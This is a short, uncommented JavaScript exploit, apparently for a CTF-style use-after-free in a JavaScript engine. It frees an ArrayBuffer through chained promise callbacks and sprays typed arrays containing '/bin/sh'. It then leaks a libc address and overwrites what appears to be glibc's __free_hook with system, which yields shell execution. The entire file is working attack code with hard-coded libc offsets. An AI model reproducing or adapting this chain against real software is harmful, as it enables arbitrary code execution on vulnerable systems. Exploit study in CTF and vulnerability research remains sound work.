const hex = (x) => {return ("0x" + x.toString(16))};
let a0, a1;

function f2() {
	console.log('Resolve Two');
	const abs = [];
	a0 = undefined;
	for (let i = 0; i < 8; i++) abs.push(new ArrayBuffer(8));; 
	
	const tas = [];
	for (let i = 0; i < 8; i++)
	{
	  const ta = new Uint32Array(abs[i]);
	  ta[0] = 1852400175;
	  ta[1] = 6845231; 
	  tas.push(ta);
	}

	const libc_addr = a1[0xa0/4]+(a1[0xa0/4+1] * 0x100000000) - 0x3ec1e0
	console.log(hex(libc_addr));
	
	a1[0x458/4] = (libc_addr + 0x3ed8e8) & 0xffffffff;
	a1[0x458/4+1] = ((libc_addr + 0x3ed8e8) - a1[0x1d8/4]) / 0x100000000;	
	tas[3][0] = (libc_addr + 0x4f550) & 0xffffffff;
	tas[3][1] = ((libc_addr + 0x4f550) - tas[3][0]) / 0x100000000;
	console.log('Finished!')

}

function f1(a) {
	console.log('Resolve One');

	arr = undefined; 

	a0 = new Uint32Array(a);

	a1 = a0; 

	let p = new Promise((resolve, reject) => {
		console.log('Resolve Two Init');
		resolve(0);
	});
	p.then(f2);
}

let arr = new ArrayBuffer(0xa00);
function main() {
	let p = new Promise((resolve, reject) => {
		console.log('Promise Init');
		resolve(arr);
	});
	p.then(f1);
	console.log('Main Finished');
}

main();